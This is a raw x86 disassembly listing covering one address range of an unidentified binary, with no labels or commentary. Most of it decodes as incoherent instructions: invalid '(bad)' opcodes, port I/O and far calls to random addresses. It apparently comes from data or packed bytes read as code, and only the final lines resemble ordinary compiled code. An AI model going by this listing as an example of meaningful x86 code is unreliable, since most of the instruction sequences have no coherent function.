  4164a6:	dec    edi
  4164a7:	loope  0x41648c
  4164a9:	div    BYTE PTR [edx+0x24]
  4164ac:	sbb    eax,0xa852fe85
  4164b1:	and    eax,0xa6f3a2b4
  4164b6:	jl     0x416535
  4164b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164b9:	call   0xc4989ae1
  4164be:	xchg   ebx,eax
  4164bf:	mov    edx,0xe5fb6482
  4164c4:	inc    edx
  4164c5:	pop    esp
  4164c6:	out    dx,eax
  4164c7:	adc    eax,0xf7054d85
  4164cc:	sub    BYTE PTR [edi+0x4cda4ad4],ch
  4164d2:	test   ch,ah
  4164d4:	test   eax,0xdc3c8092
  4164d9:	adc    DWORD PTR [eax+0x1b],esp
  4164dc:	jecxz  0x416490
  4164de:	and    al,0xbc
  4164e0:	push   ebp
  4164e1:	or     ch,BYTE PTR [edi+0x16]
  4164e4:	sub    al,0x9e
  4164e6:	sbb    BYTE PTR [edi],dl
  4164e8:	pop    edx
  4164e9:	mov    bh,0x6d
  4164eb:	pushf  
  4164ec:	cs adc al,0xd6
  4164ef:	xor    BYTE PTR [ecx],dl
  4164f1:	inc    edx
  4164f2:	pop    ecx
  4164f3:	int3   
  4164f4:	es dec eax
  4164f6:	dec    edi
  4164f7:	ror    DWORD PTR [eax+0x3d4bfe58],1
  4164fd:	retf   
  4164fe:	and    esi,DWORD PTR [eax+ebx*4-0x7]
  416502:	mov    ecx,0x2e96bb10
  416507:	test   dl,ch
  416509:	sbb    al,BYTE PTR [ebx]
  41650b:	cmp    eax,0x571e1644
  416510:	or     dh,BYTE PTR [ebx-0x5a]
  416513:	cli    
  416514:	sbb    al,0x3d
  416516:	pop    ebp
  416517:	sub    al,0xa0
  416519:	pop    esp
  41651a:	cld    
  41651b:	mov    eax,ds:0xe26f53b1
  416520:	or     ch,BYTE PTR [eax+0x13]
  416523:	ficomp DWORD PTR [ebx+edi*2+0x5bf30a70]
  41652a:	jne    0x416502
  41652c:	leave  
  41652d:	shr    DWORD PTR [ecx],1
  41652f:	pushf  
  416530:	dec    esp
  416531:	inc    ebp
  416532:	add    bl,BYTE PTR ds:0xa5dc3c04
  416538:	lds    ebx,FWORD PTR [eax-0x2c]
  41653b:	aad    0x85
  41653d:	into   
  41653e:	outs   dx,DWORD PTR ds:[esi]
  41653f:	out    0x97,al
  416541:	idiv   DWORD PTR [ecx+0x4618f7b8]
  416547:	sub    al,BYTE PTR ds:0x43e41059
  41654d:	jl     0x4165bb
  41654f:	sub    BYTE PTR [ecx],dl
  416551:	fisttp DWORD PTR [edx-0x68]
  416554:	push   ecx
  416555:	or     BYTE PTR [edx+0x63],0x6
  416559:	(bad)  
  41655a:	adc    eax,DWORD PTR [edx-0x5d1fa629]
  416560:	loopne 0x416537
  416562:	mov    ecx,0x9d7c731e
  416567:	push   cs
  416568:	or     BYTE PTR [ecx-0x66],ch
  41656b:	ss xchg esp,eax
  41656d:	arpl   WORD PTR [ecx],di
  41656f:	and    BYTE PTR [edx-0x60],bh
  416572:	add    al,0xc3
  416574:	call   0x4398:0xe4fa99f7
  41657b:	xchg   esp,eax
  41657c:	fwait
  41657d:	mov    ebx,0x106d6a5c
  416582:	dec    eax
  416583:	jp     0x4165ed
  416585:	test   eax,0x62661d28
  41658a:	lahf   
  41658b:	or     esp,DWORD PTR [esi+esi*8+0x2e]
  41658f:	sbb    BYTE PTR [edx],dl
  416591:	sar    BYTE PTR [ecx+0x23],0x80
  416595:	xor    dh,al
  416597:	inc    edi
  416598:	out    dx,eax
  416599:	inc    ebx
  41659a:	loop   0x416606
  41659c:	aas    
  41659d:	in     al,0xbc
  41659f:	out    dx,al
  4165a0:	retf   0x71af
  4165a3:	xor    eax,0x77d9c134
  4165a8:	in     al,dx
  4165a9:	pop    ebp
  4165aa:	cmp    al,0x63
  4165ac:	cmc    
  4165ad:	push   cs
  4165ae:	leave  
  4165af:	mov    dh,0x6
  4165b1:	cs adc al,0x9f
  4165b4:	add    DWORD PTR [ebp+0x56],0x204df877
  4165bb:	sbb    DWORD PTR [edx+0x6bad227a],0x70489bf5
  4165c5:	xor    BYTE PTR [ebx-0x73],al
  4165c8:	cmp    edi,esp
  4165ca:	mov    DWORD PTR [edi-0x77994396],ebx
  4165d0:	(bad)  
  4165d1:	lds    edx,FWORD PTR [edi]
  4165d3:	jg     0x4165c3
  4165d5:	xor    DWORD PTR [ecx+0x30bd1681],ebp
  4165db:	push   es
  4165dc:	jo     0x4165cf
  4165de:	leave  
  4165df:	icebp  
  4165e0:	xor    al,BYTE PTR [ecx+0x76dc19e3]
  4165e6:	jecxz  0x41661c
  4165e8:	lock xchg edi,esi
  4165eb:	mov    ch,0x79
  4165ed:	mov    BYTE PTR [eax+0x63d89634],ah
  4165f3:	and    dh,BYTE PTR [edi]
  4165f5:	pop    eax
  4165f6:	popa   
  4165f7:	ffree  st(0)
  4165f9:	jb     0x416678
  4165fb:	add    BYTE PTR [eax+edx*2+0x5dcf1f6e],bh
  416602:	mov    ds:0xc4b906e6,al
  416607:	gs mov esp,0xeb85d226
  41660d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41660e:	xor    al,0x38
  416610:	xlat   BYTE PTR ds:[ebx]
  416611:	stos   DWORD PTR es:[edi],eax
  416612:	mov    eax,0x1bd10272
  416617:	bound  ebp,QWORD PTR [ebx-0x6e26877d]
  41661d:	sub    DWORD PTR [ebx+0xe],ebx
  416620:	mov    ds:0xfac7f8b0,al
  416625:	xchg   esp,edi
  416627:	inc    ebp
  416628:	or     bh,BYTE PTR [edi-0x65f96a9b]
  41662e:	rol    DWORD PTR [edi+0x7a],1
  416631:	imul   esi,DWORD PTR [edx+0x10],0xce4bcbfe
  416638:	fnstcw WORD PTR [ecx-0x1bd63ca8]
  41663e:	sub    dl,dh
  416640:	mov    esi,?
  416642:	xor    DWORD PTR [eax+0x43caa771],edx
  416648:	pop    edi
  416649:	int3   
  41664a:	fmul   DWORD PTR [edx-0x43960f96]
  416650:	inc    ebx
  416651:	popf   
  416652:	out    dx,al
  416653:	xor    DWORD PTR [esi],0x15f46ab7
  416659:	sub    al,0x49
  41665b:	add    DWORD PTR ds:0x8636e396,esi
  416661:	mov    ds:0xedff6143,al
  416666:	pop    es
  416667:	xor    al,0x3a
  416669:	dec    ebx
  41666a:	dec    esp
  41666b:	push   ebp
  41666c:	repz idiv DWORD PTR [ecx+edx*1-0x6a12823c]
  416674:	jno    0x416683
  416676:	push   cs
  416677:	aad    0x55
  416679:	dec    eax
  41667a:	sbb    BYTE PTR [ebx+0x4e0f0835],bh
  416680:	popf   
  416681:	push   ss
  416682:	cmp    dh,bl
  416684:	push   ds
  416685:	or     edi,esi
  416687:	xchg   esi,eax
  416688:	and    al,0x74
  41668a:	les    ecx,FWORD PTR [ecx+0xf]
  41668d:	in     al,dx
  41668e:	jno    0x416676
  416690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416691:	mov    ebx,0x1edcdd11
  416696:	sub    esi,DWORD PTR [esi-0x5f95ed30]
  41669c:	xchg   ebx,eax
  41669d:	leave  
  41669e:	mov    ?,edi
  4166a0:	cmp    DWORD PTR [esi-0x22719706],eax
  4166a6:	pushw  cs
  4166a8:	out    dx,al
  4166a9:	jno    0x416717
  4166ab:	dec    ebp
  4166ac:	push   edx
  4166ad:	pop    edi
  4166ae:	into   
  4166af:	mov    bl,0x5d
  4166b1:	xchg   edx,eax
  4166b2:	jmp    0xb52b:0x30779d4c
  4166b9:	test   al,0x1e
  4166bb:	inc    edi
  4166bc:	jb     0x416665
  4166be:	mov    ecx,0x6bbee80f
  4166c3:	not    BYTE PTR [esi+0x292d4895]
  4166c9:	mov    dh,0x9d
  4166cb:	test   BYTE PTR [ecx],dl
  4166cd:	dec    ebx
  4166ce:	pop    eax
  4166cf:	pop    esp
  4166d0:	fs dec eax
  4166d2:	icebp  
  4166d3:	aam    0x54
  4166d5:	xlat   BYTE PTR ds:[ebx]
  4166d6:	mov    eax,ds:0xed7bce9f
  4166db:	cmp    eax,0x66066691
  4166e0:	in     eax,0x4e
  4166e2:	push   edi
  4166e3:	(bad)  
  4166e4:	in     eax,0x78
  4166e6:	inc    eax
  4166e7:	hlt    
  4166e8:	fwait
  4166e9:	xchg   DWORD PTR [eax+0x1fe7c10f],edx
  4166ef:	scas   eax,DWORD PTR es:[edi]
  4166f0:	jmp    0xf74ea3e2
  4166f5:	push   cs
  4166f6:	aas    
  4166f7:	xchg   edx,ebx
  4166f9:	aaa    
  4166fa:	push   edi
  4166fb:	out    dx,eax
  4166fc:	cmc    
  4166fd:	into   
  4166fe:	rcl    DWORD PTR [esi+0x15dc90a5],0x79
  416705:	mov    dh,0xda
  416707:	mov    ebx,0x2e74f2b4
  41670c:	sbb    DWORD PTR [ebp+0x454ef5fa],ebx
  416712:	adc    BYTE PTR [edx],cl
  416714:	mov    bl,0x9e
  416716:	pop    ds
  416717:	shl    DWORD PTR [ebx],1
  416719:	call   0xdd05:0x978ac4a3
  416720:	cwde   
  416721:	out    dx,eax
  416722:	inc    edx
  416723:	mov    al,0x3b
  416725:	mov    ecx,0xb7c02864
  41672a:	call   0xdff3:0x7f5f120d
  416731:	call   0x6b66:0xc3e9ae8b
  416738:	inc    eax
  416739:	daa    
  41673a:	mov    bh,0x7
  41673c:	inc    edx
  41673d:	xchg   edx,eax
  41673e:	daa    
  41673f:	mov    ds:0x105510a1,eax
  416744:	mov    gs,WORD PTR ds:0x9545b0d3
  41674a:	stc    
  41674b:	xchg   BYTE PTR [esi-0x41b38175],al
  416751:	pusha  
  416752:	xchg   ecx,eax
  416753:	scas   al,BYTE PTR es:[edi]
  416754:	daa    
  416755:	pop    edx
  416756:	cmp    ch,BYTE PTR [ebp+edx*4+0x55]
  41675a:	pusha  
  41675b:	(bad)  
  41675c:	retf   0x5d28
  41675f:	adc    eax,0x3d653f6c
  416764:	xchg   ecx,eax
  416765:	jl     0x4167d4
  416767:	sub    BYTE PTR [edi+eiz*2],dh
  41676a:	dec    BYTE PTR [ebp-0x13cec19f]
  416770:	pusha  
  416771:	mov    al,0xa6
  416773:	adc    al,0xfa
  416775:	call   DWORD PTR [ebp*2+0x15a0366b]
  41677c:	add    ebp,DWORD PTR [edx+0x1c]
  41677f:	fst    DWORD PTR [ebp-0xf]
  416782:	cmp    BYTE PTR [ebx+0x42],0x2
  416786:	push   esp
  416787:	clc    
  416788:	and    al,0x8e
  41678a:	xor    dl,al
  41678c:	icebp  
  41678d:	push   es
  41678e:	push   ecx
  41678f:	imul   eax,ecx,0xf18d88e5
  416795:	out    0x94,al
  416797:	iret   
  416798:	icebp  
  416799:	pop    esp
  41679a:	jmp    0x8ce778cb
  41679f:	or     al,dh
  4167a1:	sub    ebp,ebx
  4167a3:	push   ecx
  4167a4:	(bad)  
  4167a5:	sar    edi,cl
  4167a7:	out    dx,al
  4167a8:	push   eax
  4167a9:	add    BYTE PTR [ebx],dh
  4167ab:	je     0x416766
  4167ad:	or     eax,0x365a4fb5
  4167b2:	inc    eax
  4167b3:	or     DWORD PTR [esi+0x40],0x94e1b5d9
  4167ba:	adc    esp,DWORD PTR [esi]
  4167bc:	sub    al,0xb3
  4167be:	dec    esp
  4167bf:	lods   al,BYTE PTR ds:[esi]
  4167c0:	xchg   BYTE PTR [ecx+0x657e7913],ah
  4167c6:	or     bh,BYTE PTR [edi+0x1d]
  4167c9:	or     al,0xe4
  4167cb:	aaa    
  4167cc:	repnz mov ds:0x823cd142,al
  4167d2:	stc    
  4167d3:	loop   0x41676a
  4167d5:	fdiv   DWORD PTR [eax]
  4167d8:	push   edx
  4167d9:	retf   
  4167da:	adc    eax,0x1efd112f
  4167df:	push   edx
  4167e0:	in     al,0x86
  4167e2:	and    DWORD PTR [eax],0x56
  4167e5:	push   esi
  4167e6:	sar    BYTE PTR [edi-0x56],cl
  4167e9:	mov    bl,0x3
  4167eb:	sahf   
  4167ec:	mov    dh,bh
  4167ee:	popa   
  4167ef:	ins    BYTE PTR es:[edi],dx
  4167f0:	popf   
  4167f1:	mov    cl,0xbe
  4167f3:	cs pusha 
  4167f5:	cmp    al,BYTE PTR [ebx+esi*8+0x24]
  4167f9:	data16 jecxz 0x416802
  4167fc:	adc    eax,0x26f6913d
  416801:	imul   esp,DWORD PTR [ecx-0x2e],0xffffffc3
  416805:	mov    bh,0x35
  416807:	and    BYTE PTR [esi-0x465a3670],cl
  41680d:	pop    ebx
  41680e:	or     al,0xe5
  416810:	jle    0x416821
  416812:	jae    0x416829
  416814:	call   0xeada:0x30238a38
  41681b:	in     eax,0x9d
  41681d:	lods   al,BYTE PTR ds:[esi]
  41681e:	jmp    0x4167ea
  416820:	pop    ebp
  416821:	jmp    0x4167b8
  416823:	lock paddd mm0,QWORD PTR [edi+0x7e]
  416828:	dec    edx
  416829:	rcr    DWORD PTR [ecx-0x32],1
  41682c:	hlt    
  41682d:	xor    ebx,0xffffffaa
  416830:	xchg   edx,eax
  416831:	aaa    
  416832:	xchg   edi,eax
  416833:	loopne 0x41685d
  416835:	pop    edx
  416836:	mov    al,ch
  416838:	int3   
  416839:	call   0xcaa3:0xd1788d22
  416840:	inc    DWORD PTR [ebp+0x3d]
  416843:	cwde   
  416844:	mov    al,ds:0x51b5e491
  416849:	sbb    al,0xf9
  41684b:	push   edx
  41684c:	test   al,0xae
  41684e:	push   ebx
  41684f:	mov    cl,0x3
  416851:	sahf   
  416852:	imul   edi,DWORD PTR [eax+ecx*4+0x1cbd96c9],0x1a
  41685a:	scas   eax,DWORD PTR es:[edi]
  41685b:	fwait
  41685c:	(bad)  
  41685d:	mov    edi,0xab9cc39f
  416862:	imul   esp,ecx,0x19
  416865:	out    0xf5,eax
  416867:	dec    ebp
  416868:	sub    eax,0x7cde1afe
  41686e:	out    dx,eax
  41686f:	lea    edx,[edi+0x52]
  416872:	adc    eax,0x864f71f4
  416877:	shl    DWORD PTR ds:0xe59a0a1d,1
  41687d:	push   eax
  41687e:	pop    ebp
  41687f:	sub    ch,ah
  416881:	mov    bl,0xb5
  416883:	sbb    al,0xc4
  416885:	daa    
  416886:	sar    DWORD PTR [eax+0x7fc998ad],0x9d
  41688d:	loope  0x416889
  41688f:	sub    ch,dh
  416891:	xor    eax,0xf14ef2ce
  416896:	gs inc ebx
  416898:	fadd   DWORD PTR [ebp+ecx*8+0x7]
  41689c:	loopne 0x416889
  41689e:	arpl   WORD PTR [esi],bx
  4168a0:	call   0x2fc1:0xcbc2296f
  4168a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168a8:	je     0x4168f1
  4168aa:	pop    eax
  4168ab:	lea    ebx,[ecx]
  4168ad:	cmovb  edx,DWORD PTR [edx+esi*2-0x1a]
  4168b2:	lea    eax,[edx]
  4168b4:	mov    bl,BYTE PTR [ebx-0x40]
  4168b7:	adc    DWORD PTR [ecx-0x6e],ebp
  4168ba:	sbb    dh,BYTE PTR [ecx-0x6604b352]
  4168c0:	mov    ds:0xb9000b16,al
  4168c5:	mov    eax,0xfa1f800
  4168ca:	xlat   BYTE PTR ds:[ebx]
  4168cb:	idiv   DWORD PTR [esi-0x1c]
  4168ce:	clc    
  4168cf:	ror    BYTE PTR [edi+0x27b9b1ea],0xf6
  4168d6:	ins    DWORD PTR es:[edi],dx
  4168d7:	aaa    
  4168d8:	arpl   WORD PTR [eax+ebp*1+0x7e],di
  4168dc:	mov    ds:0x19c7639d,al
  4168e1:	mov    dl,al
  4168e3:	fwait
  4168e4:	arpl   WORD PTR [eax-0x12e4d5f9],sp
  4168ea:	repnz popf 
  4168ec:	dec    esi
  4168ed:	fs cli 
  4168ef:	ss push 0x5a3e8ca0
  4168f5:	or     al,0x17
  4168f7:	xor    eax,0x6a1cb1f1
  4168fc:	aaa    
  4168fd:	xor    dl,BYTE PTR ds:0x13caa5da
  416903:	sbb    cl,BYTE PTR [ebp-0x547eeb82]
  416909:	xchg   esp,eax
  41690a:	jbe    0x41696a
  41690c:	adc    dh,BYTE PTR [ecx+0x18]
  41690f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416910:	repnz cmp DWORD PTR [eax-0x3b98f75e],0x6e
  416918:	call   0x5c32f1d7
  41691d:	push   ecx
  41691e:	inc    eax
  41691f:	add    ah,BYTE PTR [ebx]
  416921:	mov    DWORD PTR [ebp+0x2c490b99],ecx
  416927:	push   es
  416928:	inc    edx
  416929:	xor    eax,0x17822518
  41692e:	in     al,dx
  41692f:	aaa    
  416930:	xor    eax,0x4f300d73
  416935:	mov    bl,0x46
  416937:	enter  0x619,0x81
  41693b:	mov    cl,0xfc
  41693d:	mov    eax,ds:0x4594144f
  416942:	push   edx
  416943:	cmp    DWORD PTR [ebx-0x23],ecx
  416946:	push   edi
  416947:	lods   eax,DWORD PTR ds:[esi]
  416948:	jbe    0x416973
  41694a:	push   ebp
  41694b:	leave  
  41694c:	cdq    
  41694d:	inc    ebp
  41694e:	xor    edi,ebx
  416950:	gs push esi
  416952:	inc    ebp
  416953:	std    
  416954:	inc    ecx
  416955:	jle    0x41698a
  416957:	arpl   dx,bp
  416959:	fnstenv [ebp+0x56439d3b]
  41695f:	cmp    DWORD PTR [ebx],ebx
  416961:	sti    
  416962:	pop    ss
  416963:	inc    ecx
  416964:	jmp    0x5e06fa4e
  416969:	pop    ss
  41696a:	lods   eax,DWORD PTR ds:[esi]
  41696b:	addr16 inc bx
  41696e:	pop    ebx
  41696f:	jbe    0x416971
  416971:	(bad)
  416975:	and    al,0xdc
  416977:	nop
  416978:	fwait
  416979:	sbb    al,0xf0
  41697b:	add    al,0x76
  41697d:	xor    BYTE PTR [esi+0x7a],al
  416980:	fst    DWORD PTR [eax]
  416982:	xor    al,0x4f
  416984:	jmp    0xf59c9596
  416989:	or     ah,ah
  41698b:	xor    BYTE PTR [eax+0x762d0651],ch
  416991:	fs mov dh,0x9f
  416994:	ror    BYTE PTR [esi],0x85
  416997:	adc    eax,0x14345987
  41699c:	xlat   BYTE PTR ds:[ebx]
  41699d:	xor    dl,BYTE PTR [edi+0xb]
  4169a0:	pop    edx
  4169a1:	mov    al,ds:0xf426326c
  4169a6:	sbb    bl,dh
  4169a8:	out    0xd0,al
  4169aa:	xchg   ecx,eax
  4169ab:	sub    DWORD PTR [edx+ecx*2+0x57],ecx
  4169af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169b0:	ror    BYTE PTR ds:0x1d988d9d,1
  4169b6:	call   0x6be6:0x5a9bb30f
  4169bd:	mov    dh,0xff
  4169bf:	int    0xe6
  4169c1:	(bad)  
  4169c2:	into   
  4169c3:	jne    0x416a15
  4169c5:	test   DWORD PTR [edi+edi*4],0x7bac23a6
  4169cc:	aam    0xac
  4169ce:	sub    ecx,DWORD PTR [esi]
  4169d0:	push   ecx
  4169d1:	sub    BYTE PTR [ecx-0x1],al
  4169d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d5:	mov    ebx,0xeb47dc90
  4169da:	retf   
  4169db:	ss jbe 0x41698b
  4169de:	pop    ebx
  4169df:	xor    BYTE PTR [edx+edi*1],0xb0
  4169e3:	ss daa 
  4169e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e6:	out    0xa2,eax
  4169e8:	ins    BYTE PTR es:[edi],dx
  4169e9:	mov    ds:0x5c3a1a60,al
  4169ee:	shl    DWORD PTR [edx],1
  4169f0:	sub    ecx,edx
  4169f2:	pop    ebp
  4169f3:	sbb    eax,0x83b5530e
  4169f8:	pop    ecx
  4169f9:	mov    edi,0xc7bbfe2e
  4169fe:	cwde   
  4169ff:	aas    
  416a00:	mov    ax,WORD PTR [ecx]
  416a03:	into   
  416a04:	int3   
  416a05:	dec    ebx
  416a06:	enter  0x455b,0x15
  416a0a:	lock cwde 
  416a0c:	push   esp
  416a0d:	jp     0x4169bb
  416a0f:	pop    ss
  416a10:	(bad)  
  416a11:	arpl   WORD PTR [esi-0x72e69ad6],dx
  416a17:	pop    ecx
  416a18:	imul   esp,DWORD PTR [ebx+0x42af439f],0xffffff90
  416a1f:	and    DWORD PTR [eax],edi
  416a21:	jbe    0x416a6a
  416a23:	shl    DWORD PTR [ebx],0x4c
  416a26:	js     0x4169d4
  416a28:	in     eax,dx
  416a29:	add    bl,dl
  416a2b:	adc    cl,BYTE PTR ds:0xd4ec820f
  416a31:	ins    BYTE PTR es:[edi],dx
  416a32:	mov    al,ds:0x7819cc5a
  416a37:	mov    ebx,0xa2c1368c
  416a3c:	sbb    al,0x94
  416a3e:	aaa    
  416a3f:	stos   DWORD PTR es:[edi],eax
  416a40:	ret    
  416a41:	inc    edi
  416a42:	ror    DWORD PTR [edi-0x55],0xe2
  416a46:	or     DWORD PTR [edx],ebp
  416a48:	icebp  
  416a49:	ret    0x6117
  416a4c:	cmp    ch,dh
  416a4e:	sbb    al,0x5c
  416a50:	cmp    ebp,DWORD PTR [ebp+ebp*1+0x1765b3ad]
  416a57:	fwait
  416a58:	cli    
  416a59:	jle    0x416aa0
  416a5b:	sub    eax,DWORD PTR [edx-0x61]
  416a5e:	out    dx,eax
  416a5f:	ss xchg ecx,eax
  416a61:	cmp    al,0xff
  416a63:	cmp    eax,0xf6c330be
  416a68:	repz mov dl,0x61
  416a6b:	mov    al,0xaf
  416a6d:	mov    cl,0xe6
  416a6f:	xchg   edx,eax
  416a70:	in     eax,dx
  416a71:	test   BYTE PTR [edx-0x69],dh
  416a74:	adc    DWORD PTR [edx+0x3f9d5a1f],ebx
  416a7a:	pop    esi
  416a7b:	out    0xcd,al
  416a7d:	inc    DWORD PTR [edi-0x4c]
  416a80:	shl    ch,0xa8
  416a83:	add    eax,0x917d4b78
  416a88:	pop    ss
  416a89:	add    eax,0x570ee0af
  416a8e:	sahf   
  416a8f:	test   DWORD PTR [edx-0x2e9c5c55],edx
  416a95:	and    eax,0x9661b632
  416a9a:	jmp    0x11c7fc9b
  416a9f:	push   edi
  416aa0:	fsubr  DWORD PTR [edi-0x2ba88bca]
  416aa6:	inc    eax
  416aa7:	out    0xe3,eax
  416aa9:	ds mov esp,0xf9623053
  416aaf:	add    DWORD PTR [edx-0x1c94bda2],edx
  416ab5:	xor    eax,DWORD PTR [ebx+0x7e]
  416ab8:	push   edx
  416ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aba:	mov    bh,0x89
  416abc:	iret   
  416abd:	imul   edx,DWORD PTR [ebx],0x54f5ad3f
  416ac3:	int    0xf9
  416ac5:	adc    al,0x31
  416ac7:	dec    esp
  416ac8:	call   0x7ce61523
  416acd:	jmp    0x416a82
  416acf:	and    ah,bl
  416ad1:	mov    dl,0x29
  416ad3:	pop    eax
  416ad4:	bound  edi,QWORD PTR [esi+eax*1]
  416ad7:	sub    ah,BYTE PTR [ebx+0x2ad1e960]
  416add:	push   ds
  416ade:	aaa    
  416adf:	add    edx,esp
  416ae1:	and    BYTE PTR [edx+ecx*1],bl
  416ae4:	js     0x416ade
  416ae6:	or     BYTE PTR [edi+edi*8+0x73],ch
  416aea:	stos   BYTE PTR es:[edi],al
  416aeb:	lock dec eax
  416aed:	cmp    DWORD PTR [esi+edx*4],edi
  416af0:	adc    bl,BYTE PTR [ecx]
  416af2:	outs   dx,DWORD PTR ds:[esi]
  416af3:	in     al,dx
  416af4:	adc    eax,0x7907f121
  416af9:	loop   0x416b10
  416afb:	scas   al,BYTE PTR es:[edi]
  416afc:	or     eax,0x39d9a299
  416b01:	pop    ss
  416b02:	adc    BYTE PTR [esi-0x69],al
  416b05:	popa   
  416b06:	sub    cl,BYTE PTR [edi-0x69]
  416b09:	add    al,cl
  416b0b:	sbb    BYTE PTR [edi],ah
  416b0d:	pop    edx
  416b0e:	cmp    edi,ecx
  416b10:	scas   eax,DWORD PTR es:[edi]
  416b11:	or     al,BYTE PTR [ebp+0x4f4fcc64]
  416b17:	leave  
  416b18:	xchg   DWORD PTR [edi-0x11],eax
  416b1b:	jg     0x416ae6
  416b1d:	jg     0x416ab9
  416b1f:	and    ecx,ebx
  416b21:	or     DWORD PTR [eax+0x30336aca],0xde5b8934
  416b2b:	mov    ah,0x84
  416b2d:	cwde   
  416b2e:	(bad)  
  416b30:	mov    cl,0xd7
  416b32:	sub    eax,0x58bf3096
  416b37:	xchg   ebx,eax
  416b38:	cmp    DWORD PTR [edx-0x245f9444],0x50
  416b3f:	lods   eax,DWORD PTR ds:[esi]
  416b40:	xor    eax,0xa9f72d89
  416b45:	fild   DWORD PTR [esp+esi*8+0x292bc553]
  416b4c:	(bad)  
  416b4e:	call   0x1c16:0x63a30c30
  416b55:	das    
  416b56:	pop    esp
  416b57:	stos   DWORD PTR es:[edi],eax
  416b58:	fwait
  416b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b5a:	dec    esi
  416b5b:	ds (bad) 
  416b5d:	shl    BYTE PTR [edx-0x4e],1
  416b60:	not    BYTE PTR [ecx+ecx*8-0x78]
  416b64:	dec    edi
  416b65:	sub    BYTE PTR [ecx],dl
  416b67:	and    eax,0xa4f167f0
  416b6c:	jl     0x416b3c
  416b6e:	repnz repz idiv DWORD PTR cs:[ecx]
  416b73:	pusha  
  416b74:	jle    0x416b73
  416b76:	add    dl,ah
  416b78:	push   edx
  416b79:	into   
  416b7a:	arpl   WORD PTR [esi-0x2b],si
  416b7d:	ficomp WORD PTR [esi+0x1bb33742]
  416b83:	cmp    BYTE PTR [edx+0x757b7ec9],ah
  416b89:	in     eax,0x1a
  416b8b:	mov    al,0xd2
  416b8d:	scas   al,BYTE PTR es:[edi]
  416b8e:	and    eax,0x1d933347
  416b93:	add    DWORD PTR [ebx],esp
  416b95:	in     al,dx
  416b96:	aad    0x61
  416b98:	into   
  416b99:	cdq    
  416b9a:	scas   al,BYTE PTR es:[edi]
  416b9b:	jbe    0x416b87
  416b9d:	jns    0x416b69
  416b9f:	mov    eax,esp
  416ba1:	scas   al,BYTE PTR es:[edi]
  416ba2:	lods   al,BYTE PTR ds:[esi]
  416ba3:	xchg   edi,eax
  416ba4:	cmp    eax,0xc58328f
  416ba9:	out    0x52,al
  416bab:	pop    edi
  416bac:	mov    ebx,DWORD PTR fs:[bp-0x12]
  416bb1:	in     al,0x7b
  416bb3:	mov    esi,DWORD PTR [ebp-0x7e]
  416bb6:	test   al,0x62
  416bb8:	xor    DWORD PTR [eax+esi*8],0xfc10176a
  416bbf:	jmp    0x472e2a2b
  416bc4:	std    
  416bc5:	and    al,0x6e
  416bc7:	out    0x9b,eax
  416bc9:	call   0xc029d2c6
  416bce:	adc    esi,esi
  416bd0:	addr16 or eax,0x4c59251b
  416bd6:	push   ds
  416bd7:	cdq    
  416bd8:	and    edx,DWORD PTR [edi]
  416bda:	xchg   esp,eax
  416bdb:	cld    
  416bdc:	(bad)  
  416bdd:	out    0xdf,eax
  416bdf:	mov    ch,0xc8
  416be1:	cmp    dl,ah
  416be3:	es inc edi
  416be5:	or     eax,0x6e071dae
  416bea:	mov    ch,0xe6
  416bec:	jbe    0x416c4f
  416bee:	jecxz  0x416c61
  416bf0:	mov    bl,0x3b
  416bf2:	inc    esp
  416bf3:	jg     0x416b7d
  416bf5:	mov    ecx,0x9044c2ad
  416bfa:	aaa    
  416bfb:	in     eax,dx
  416bfc:	test   bl,bl
  416bfe:	(bad)  
  416bff:	(bad)  
  416c00:	xchg   esi,eax
  416c01:	and    al,dl
  416c03:	out    dx,al
  416c04:	dec    edi
  416c05:	mov    cs,eax
  416c07:	lea    ebx,[eax+0x2857d811]
  416c0d:	cmp    BYTE PTR [esi+esi*4],bl
  416c10:	aas    
  416c11:	sti    
  416c12:	xor    eax,0xed7e7698
  416c17:	add    al,BYTE PTR [ecx+0x70]
  416c1a:	sbb    al,0xf8
  416c1c:	xchg   ebp,eax
  416c1d:	icebp  
  416c1e:	or     ecx,ebp
  416c20:	push   esp
  416c21:	icebp  
  416c22:	add    BYTE PTR [eax],ah
  416c24:	mov    dl,0x38
  416c26:	das    
  416c27:	pop    ebp
  416c28:	sbb    bl,dh
  416c2a:	add    DWORD PTR [edx],0x8d445d36
  416c30:	cmp    al,bh
  416c32:	push   esi
  416c33:	ret    0xec8b
  416c36:	xor    BYTE PTR [ecx+0x74],bl
  416c39:	outs   dx,DWORD PTR ds:[esi]
  416c3a:	mov    DWORD PTR [ecx+0x63ad4259],edx
  416c40:	cmp    DWORD PTR [ecx-0x68fcdae2],eax
  416c46:	or     ch,BYTE PTR [ecx]
  416c48:	xchg   DWORD PTR [ebp+0x39],esp
  416c4b:	rcr    al,1
  416c4d:	pop    ss
  416c4e:	jno    0x416bf4
  416c50:	push   edx
  416c51:	dec    eax
  416c52:	pusha  
  416c53:	mov    dl,0x4f
  416c55:	pxor   mm3,QWORD PTR [eax+0x7c]
  416c59:	daa    
  416c5a:	mov    ebp,0xb224d31b
  416c5f:	fwait
  416c60:	hlt    
  416c61:	xor    eax,0xd31b9c8a
  416c66:	into   
  416c67:	in     al,0x73
  416c69:	jmp    0xc162:0x42cd1bd8
  416c70:	fs jp  0x416c2d
  416c73:	sub    dh,BYTE PTR [ecx+0x67955305]
  416c79:	mov    esp,0x92c7c864
  416c7e:	mov    ebp,0x8c66480e
  416c83:	pop    ebx
  416c84:	mov    eax,0xf4b816c7
  416c89:	in     eax,dx
  416c8a:	stos   BYTE PTR es:[edi],al
  416c8b:	fidivr DWORD PTR [ebx-0x746c300f]
  416c91:	pop    ebp
  416c92:	clc    
  416c93:	xor    edx,eax
  416c95:	xor    ebx,eax
  416c97:	sub    edx,ebx
  416c99:	sub    edx,esi
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
